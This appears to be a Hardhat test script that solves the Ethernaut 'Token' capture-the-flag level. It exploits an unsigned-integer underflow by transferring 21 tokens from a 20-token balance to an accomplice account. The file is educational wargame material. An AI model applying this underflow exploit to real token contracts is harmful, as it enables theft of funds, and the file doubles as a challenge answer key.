import { expect } from "chai";
import { Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel } from "./utils";

let accounts: Signer[];
let eoa: Signer;
let accomplice: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;

before(async () => {
  accounts = await ethers.getSigners();
  eoa = accounts[0];
  accomplice = accounts[1];
  console.log('eoa: ', eoa.getAddress());
  console.log('accomplice: ', accomplice.getAddress());

  const challengeFactory = await ethers.getContractFactory(`Token`);
  const challengeAddress = await createChallenge(
    `0x478f3476358Eb166Cb7adE4666d04fbdDB56C407`
  );
  challenge = await challengeFactory.attach(challengeAddress);
});

it("solves the challenge", async function () {
  const accompliceAddress = await accomplice.getAddress();
  // contract uses unsigned integer which is always >= 0, overflow check is useless
  tx = await challenge
    .connect(eoa)
    // we start with 20 tokens, make sure eoa's balance doesn't overflow as well
    .transfer(accompliceAddress, 21n);
  await tx.wait();
});

after(async () => {
  expect(await submitLevel(challenge.target as string), "level not solved").to.be.true;
});
